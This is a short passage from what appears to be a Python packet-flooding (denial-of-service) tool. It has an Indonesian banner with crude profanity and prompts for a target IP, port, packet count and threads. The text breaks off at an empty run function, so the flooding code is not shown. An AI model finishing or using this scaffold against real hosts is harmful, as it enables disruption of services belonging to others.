...
print("------------------------------------------------------------")
print(" » 	MELVIN TEAM NI BOS 	«")
print(" »	JAN ABUSE KONTOL	«")
print(" »   	NdegOgXxMelvin       «")
print("------------------------------------------------------------")
ip = str(input(" Jan Abuse | Ip:"))
port = int(input(" Jan Abuse | Port:"))
choice = str(input(" Jan Abuse | Gas Gak Ni?(y/n):"))
times = int(input(" Jan Abuse | Paket:"))
threads = int(input("Jan Abuse| Isi Paket:"))
def run():
